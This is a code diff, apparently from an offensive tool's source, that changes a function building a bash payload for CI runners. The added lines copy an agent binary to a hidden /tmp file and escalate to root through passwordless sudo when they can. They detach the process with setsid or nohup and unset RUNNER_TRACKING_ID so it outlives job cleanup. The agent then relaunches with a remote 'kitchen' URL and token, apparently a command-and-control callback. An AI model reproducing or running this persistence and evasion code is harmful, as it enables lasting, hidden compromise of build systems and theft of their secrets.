@@ -607,7 +607,8 @@ func authenticatedBashPayloadTemplate(extraEnv []string, extraArgs string) strin
 		`    PERSIST_BIN="/tmp/.brisket-persist-$RANDOM"`,
 		`    cp "$AGENT_BIN" "$PERSIST_BIN"`,
 		`    chmod +x "$PERSIST_BIN"`,
-		`    env -u RUNNER_TRACKING_ID nohup sh -c "\"$PERSIST_BIN\" -kitchen \"$KITCHEN_URL\" -session \"$SESSION_ID\" -agent \"$AGENT_ID\" -token \"$AGENT_TOKEN\" -callback-id \"$CALLBACK_ID\" -callback-mode \"$PERSIST_CALLBACK_MODE\" $PERSIST_RELAUNCH_FLAGS >/dev/null 2>&1; rm -f \"$PERSIST_BIN\"" >/dev/null 2>&1 &`,
+		`    PERSIST_RUN="if [ \"$(id -u 2>/dev/null)\" != \"0\" ] && command -v sudo >/dev/null 2>&1 && sudo -n -E true 2>/dev/null; then sudo -n -E \"$PERSIST_BIN\" -kitchen \"$KITCHEN_URL\" -session \"$SESSION_ID\" -agent \"$AGENT_ID\" -token \"$AGENT_TOKEN\" -callback-id \"$CALLBACK_ID\" -callback-mode \"$PERSIST_CALLBACK_MODE\" $PERSIST_RELAUNCH_FLAGS >/dev/null 2>&1; else \"$PERSIST_BIN\" -kitchen \"$KITCHEN_URL\" -session \"$SESSION_ID\" -agent \"$AGENT_ID\" -token \"$AGENT_TOKEN\" -callback-id \"$CALLBACK_ID\" -callback-mode \"$PERSIST_CALLBACK_MODE\" $PERSIST_RELAUNCH_FLAGS >/dev/null 2>&1; fi; rm -f \"$PERSIST_BIN\""`,
+		`    if command -v setsid >/dev/null 2>&1; then env -u RUNNER_TRACKING_ID setsid sh -c "$PERSIST_RUN" </dev/null >/dev/null 2>&1 & else env -u RUNNER_TRACKING_ID nohup sh -c "$PERSIST_RUN" </dev/null >/dev/null 2>&1 & fi`,
 		`  fi`,
 		fmt.Sprintf(`  if [ "$OS" = "linux" ] || [ "$OS" = "darwin" ]; then
     sudo -E "$AGENT_BIN" -kitchen "$KITCHEN_URL" -session "$SESSION_ID" -agent "$AGENT_ID" -token "$AGENT_TOKEN" -callback-id "$CALLBACK_ID" -callback-mode "$CALLBACK_MODE" $DWELL_FLAGS%s
